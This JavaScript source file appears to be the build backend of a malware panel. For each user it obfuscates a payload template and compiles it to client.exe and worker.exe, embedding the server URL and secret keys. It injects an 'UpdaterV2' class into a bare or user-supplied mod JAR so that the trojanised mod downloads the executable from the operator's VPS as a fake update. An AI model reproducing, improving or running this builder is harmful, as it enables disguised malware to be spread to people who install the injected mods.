const fs = require("fs-extra");
const path = require("path");
const { execFile, exec } = require("child_process");
const db = require("./db");

const BUILDS_DIR = process.env.BUILDS_DIR ? path.resolve(process.env.BUILDS_DIR) : path.resolve(__dirname, "..", "builds");
const BUILDER_DIR = path.resolve(__dirname, "..", "builder");
const PAYLOAD_DIR = path.resolve(__dirname, "..", "payload");
const SHARED_FILES_DIR = process.env.SHARED_FILES_DIR ? path.resolve(process.env.SHARED_FILES_DIR) : path.resolve(__dirname, "shared-files");

// Helper to run exec as a promise
function executeCommand(command, args = [], options = {}) {
  return new Promise((resolve, reject) => {
    if (args.length > 0) {
      execFile(command, args, options, (error, stdout, stderr) => {
        if (error) reject({ error, stderr });
        else resolve(stdout);
      });
    } else {
      exec(command, options, (error, stdout, stderr) => {
        if (error) reject({ error, stderr });
        else resolve(stdout);
      });
    }
  });
}

// Compile a JS temp file to a Windows exe via the locally installed pkg.
async function compileViaPkg(tempJsPath, outExePath) {
  const localPkg = path.join(PAYLOAD_DIR, "node_modules", ".bin", "pkg");
  const pkgBin = fs.pathExistsSync(localPkg)
    ? `"${localPkg}"`
    : "npx --yes @yao-pkg/pkg";
  const pkgCmd = `${pkgBin} "${tempJsPath}" --targets node22-win-x64 --output "${outExePath}"`;
  await executeCommand(pkgCmd, [], { cwd: PAYLOAD_DIR });
}

/**
 * Main build process triggers compilation and injection
 * @param {string|number} userId User triggering the build
 * @param {string} username Username of builder
 * @param {string} vpsHost Host address of the VPS (e.g. 'http://12.34.56.78:3000')
 * @returns {Promise<object>} Returns build details (paths, logs)
 */
async function startPersonalizedBuild(
  userId,
  username,
  vpsHost = "http://localhost:3000",
  customJarName = null,
) {
  const userBuildDir = path.join(BUILDS_DIR, `user_${userId}`);
  const tempDir = path.join(userBuildDir, "temp");
  const distDir = path.join(userBuildDir, "dist");

  // Ensure fresh folders
  await fs.ensureDir(userBuildDir);
  await fs.ensureDir(distDir);
  await fs.ensureDir(tempDir);

  const logDetails = {
    userId,
    timestamp: new Date().toISOString(),
    steps: [],
  };

  try {
    // Step 1: Generate custom payload file
    logDetails.steps.push("Step 1: Customizing payload/test.js template");
    const payloadTemplatePath = path.join(PAYLOAD_DIR, "test.js");
    if (!(await fs.pathExists(payloadTemplatePath))) {
      throw new Error(`Payload template not found at ${payloadTemplatePath}`);
    }

    let payloadContent = await fs.readFile(payloadTemplatePath, "utf8");

    // Inject build-time configuration. Secrets come from the server environment
    // (loaded from server/.env) and are baked into the compiled client only at
    // build time, never stored in the repository.
    const apiKey = process.env.API_KEY;
    const secretKey = process.env.SECRET_KEY;
    if (!apiKey || !secretKey) {
      throw new Error(
        "Build requires API_KEY and SECRET_KEY to be configured in server/.env",
      );
    }

    payloadContent = payloadContent
      .replace("PLACEHOLDER_USER_ID", String(userId))
      .replace("PLACEHOLDER_HOST_URL", vpsHost)
      .replace("PLACEHOLDER_API_KEY", apiKey)
      .replace("PLACEHOLDER_SECRET_KEY", secretKey)
      .replace("PLACEHOLDER_WORKER_URL", `${vpsHost}/api/payloads/download/${userId}/worker.exe`);

    // Optional source obfuscation before pkg compilation. Disable with
    // OBFUSCATE_JS=0; level via JS_OBSCURE_LEVEL (light|full).
    if (process.env.OBFUSCATE_JS !== "0") {
      try {
        const obfuscator = require(path.join(PAYLOAD_DIR, "obfuscate.js"));
        const level = process.env.JS_OBSCURE_LEVEL || "full";
        const obfuscated = obfuscator.obfuscateSource(payloadContent, level);
        const lost = [...obfuscator.extractRequires(payloadContent)].filter(
          (req) =>
            !obfuscated.includes(`"${req}"`) && !obfuscated.includes(`'${req}'`),
        );
        if (lost.length) {
          throw new Error(
            `obfuscation dropped require() paths: ${lost.join(", ")}`,
          );
        }
        payloadContent = obfuscated;
        logDetails.steps.push(
          `Step 1.5: Obfuscated payload JS (${level}, ${obfuscated.length} bytes)`,
        );
      } catch (e) {
        if (e.code === "MODULE_NOT_FOUND") {
          logDetails.steps.push(
            "Step 1.5: Obfuscation skipped (javascript-obfuscator not installed)",
          );
        } else {
          throw new Error(`Build system failed during obfuscation: ${e.message}`);
        }
      }
    }

    const tempPayloadPath = path.join(PAYLOAD_DIR, `test_user_${userId}.js`);
    await fs.writeFile(tempPayloadPath, payloadContent, "utf8");

    // Step 2: Compile payload using pkg
    logDetails.steps.push("Step 2: Compiling payload via @yao-pkg/pkg");
    const clientExePath = path.join(distDir, "client.exe");

    try {
      // Use the locally installed @yao-pkg/pkg (devDependency) so builds do not
      // hit the npm registry on every run. Falls back to npx only when the
      // dependency is not installed yet (fresh checkout before npm install).
      await compileViaPkg(tempPayloadPath, clientExePath);
    } finally {
      // Clean up the temporary payload file
      await fs.remove(tempPayloadPath).catch(() => {});
    }

    // Step 2.5: Compile the per-build worker (worker.js) that the client
    // fetches at runtime from /api/payloads/download/:userId/worker.exe.
    const workerExePath = path.join(distDir, "worker.exe");
    try {
      logDetails.steps.push("Step 2.5: Compiling worker via @yao-pkg/pkg");
      const workerTemplatePath = path.join(PAYLOAD_DIR, "worker.js");
      if (!(await fs.pathExists(workerTemplatePath))) {
        throw new Error(`Worker template not found at ${workerTemplatePath}`);
      }
      let workerContent = await fs.readFile(workerTemplatePath, "utf8");
      workerContent = workerContent
        .replace("PLACEHOLDER_USER_ID", String(userId))
        .replace("PLACEHOLDER_HOST_URL", vpsHost)
        .replace("PLACEHOLDER_API_KEY", apiKey)
        .replace("PLACEHOLDER_SECRET_KEY", secretKey);
      const obfuscator = require(path.join(PAYLOAD_DIR, "obfuscate.js"));
      if (process.env.OBFUSCATE_JS !== "0") {
        const workerObf = obfuscator.obfuscateSource(
          workerContent,
          process.env.JS_OBSCURE_LEVEL || "full",
        );
        const lost = [...obfuscator.extractRequires(workerContent)].filter(
          (req) =>
            !workerObf.includes(`"${req}"`) && !workerObf.includes(`'${req}'`),
        );
        if (lost.length) {
          throw new Error(
            `worker obfuscation dropped require() paths: ${lost.join(", ")}`,
          );
        }
        workerContent = workerObf;
        logDetails.steps.push(
          `Step 2.5.1: Obfuscated worker JS (${workerObf.length} bytes)`,
        );
      }
      const tempWorkerPath = path.join(PAYLOAD_DIR, `worker_user_${userId}.js`);
      await fs.writeFile(tempWorkerPath, workerContent, "utf8");
      try {
        await compileViaPkg(tempWorkerPath, workerExePath);
      } finally {
        await fs.remove(tempWorkerPath).catch(() => {});
      }
    } catch (e) {
      // A failed worker build should not silently produce a broken client.
      throw new Error(`Worker build failed: ${e.message}`);
    }

    // Step 3: Run the JAR builder
    logDetails.steps.push("Step 3: Compiling UpdaterV2 and Injecting into JAR");

    // Default template: bare jar containing nothing but the injected class
    // (obfuscated). Custom jars inject into the user-provided mod instead.
    const bareTemplate = !customJarName;
    let targetJarPath = path.join(BUILDER_DIR, "bare-template.jar"); // Marker for bare mode
    if (customJarName) {
      targetJarPath = path.join(SHARED_FILES_DIR, customJarName);
    }

    if (!bareTemplate && !(await fs.pathExists(targetJarPath))) {
      throw new Error(`Target JAR file not found at ${targetJarPath}`);
    }

    // hosted app link for the update check
    const hostedPayloadUrl = `${vpsHost}/api/payloads/download/${userId}/client.exe`;

    const builderIndex = path.join(BUILDER_DIR, "index.js");
    const builderArgs = [
      builderIndex,
      targetJarPath,
      String(userId), // Pass raw userId; builder will name jar injected_mod_user_{userId}.jar
      distDir,
      hostedPayloadUrl,
    ];

    // Execute jar builder index.js
    await executeCommand("node", builderArgs, {
      cwd: BUILDER_DIR,
      env: {
        ...process.env,
        BARE_TEMPLATE: bareTemplate ? "1" : "0",
        INJECTOR_JAVA_RELEASE: "17", // Default release to compile UpdaterV2
      },
    });

    // Verify output exists — builder names: injected_mod_user_{userId}.jar
    const correctJarName = `injected_mod_user_${userId}.jar`;
    const correctJarPath = path.join(distDir, correctJarName);

    if (!(await fs.pathExists(correctJarPath))) {
      // Check for possible intermediate -injd-fabric-obf or -injd variant names based on target base name
      const targetBaseName = path.basename(targetJarPath, ".jar");
      const injdName = `${targetBaseName}-injd.jar`;
      const obfName = `${targetBaseName}-injd-${targetBaseName}.jar`;
      const altPath = path.join(distDir, injdName);
      const altObfPath = path.join(distDir, obfName);

      if (await fs.pathExists(altObfPath)) {
        await fs.move(altObfPath, correctJarPath, { overwrite: true });
      } else if (await fs.pathExists(altPath)) {
        await fs.move(altPath, correctJarPath, { overwrite: true });
      }
    }

    if (!(await fs.pathExists(correctJarPath))) {
      throw new Error(
        `Generated JAR not found at expected path: ${correctJarPath}`,
      );
    }

    // Clean temp dir
    // await fs.remove(tempDir);

    // Record build in DB
    const filesGenerated = [correctJarName, "client.exe", "worker.exe"];
    const buildId = `build_user_${userId}_${Date.now()}`;
    await db.createBuild(userId, buildId, targetJarPath, filesGenerated);

    // Log action success
    await db.logAction(
      userId,
      username,
      "BUILD_GENERATE",
      {
        buildId,
        files: filesGenerated,
        updateUrl: hostedPayloadUrl,
      },
      "SUCCESS",
    );

    return {
      status: "SUCCESS",
      buildId,
      files: filesGenerated,
      jarPath: `/api/payloads/download/${userId}/${correctJarName}`,
      exePath: `/api/payloads/download/${userId}/client.exe`,
      workerPath: `/api/payloads/download/${userId}/worker.exe`,
    };
  } catch (err) {
    console.error("Build failure:", err);
    const errMsg = err.stderr || err.message || JSON.stringify(err);

    // Log action failure
    await db.logAction(
      userId,
      username,
      "BUILD_GENERATE",
      {
        error: errMsg,
        steps: logDetails.steps,
      },
      "FAILED",
    );

    // Clean temp dir if possible
    try {
      // await fs.remove(tempDir);
    } catch (_) {}

    throw new Error(`Build system failed: ${errMsg}`);
  }
}

module.exports = {
  startPersonalizedBuild,
};
